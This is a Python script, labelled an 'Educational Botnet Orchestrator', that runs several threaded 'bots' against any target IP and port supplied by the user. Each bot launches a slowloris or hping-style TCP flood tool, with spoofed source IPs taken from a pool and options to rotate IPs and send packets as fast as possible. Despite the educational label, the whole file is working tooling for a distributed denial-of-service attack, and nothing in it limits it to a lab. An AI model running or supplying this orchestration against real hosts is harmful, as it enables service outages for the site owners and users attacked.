import subprocess
import sys
import os
import argparse
import time
import threading

# Educational Botnet Orchestrator
# This script simulates a coordinated attack from multiple 'bots'.
# Each bot is assigned a unique source IP or pool from a provided list.

def launch_bot(bot_id, target, port, tool, ips, rotate=False, flood=False):
    print(f"[+] [Bot {bot_id}] Starting up... (IPs: {ips})")
    
    tools_dir = os.path.dirname(os.path.abspath(__file__))
    
    if tool == "slowloris":
        script_path = os.path.join(tools_dir, "slowloris_sim.py")
        # For simulation, we limit sockets per bot but use the assigned IPs
        cmd = [sys.executable, "-u", script_path, target, "-p", str(port), "-s", "20", "--ips", ips]
    else: # hping (Python version)
        script_path = os.path.join(tools_dir, "hping_lite.py")
        cmd = [sys.executable, "-u", script_path, target, str(port), "tcp", ips]
        if rotate:
            cmd.append("--continuous")
        if flood:
            cmd.append("--flood")

    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        for line in process.stdout:
            if line.strip():
                print(f"    [Bot {bot_id}] {line.strip()}")
                
    except Exception as e:
        print(f"[!] [Bot {bot_id}] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="Educational Botnet Orchestrator")
    parser.add_argument("target", help="Target host IP")
    parser.add_argument("-p", "--port", type=int, default=80)
    parser.add_argument("-b", "--bots", type=int, default=3, help="Number of bots to simulate")
    parser.add_argument("--ips", help="Comma-separated pool of source IPs", required=True)
    parser.add_argument("--tool", choices=["slowloris", "hping"], default="slowloris")
    parser.add_argument("--rotate", action="store_true", help="Tell bots to rotate through their assigned IPs")
    parser.add_argument("--flood", action="store_true", help="Tell bots to send packets as fast as possible")
    
    args = parser.parse_args()
    
    all_ips = args.ips.split(",")
    if len(all_ips) < 1:
        print("[!] Error: At least one source IP is required.")
        return

    print(f"[*] Initializing Distributed Botnet with {args.bots} bots targeting {args.target}:{args.port}")
    print(f"[*] Tool: {args.tool.upper()}, Rotation: {'ENABLED' if args.rotate else 'DISABLED'}, Flood: {'ENABLED' if args.flood else 'DISABLED'}")
    print("-" * 60)

    threads = []
    for i in range(args.bots):
        # Distribute IPs: Each bot gets a slice or the whole pool if small
        # For hping + rotate, we give the whole pool to each bot for maximum distribution
        if (args.rotate or args.flood) and args.tool == "hping":
            bot_ips = args.ips
        else:
            bot_ips = all_ips[i % len(all_ips)]

        t = threading.Thread(target=launch_bot, args=(i+1, args.target, args.port, args.tool, bot_ips, args.rotate, args.flood))
        t.daemon = True
        threads.append(t)
        t.start()
        time.sleep(0.5) # Fast stagger

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down botnet orchestration...")

if __name__ == "__main__":
    main()
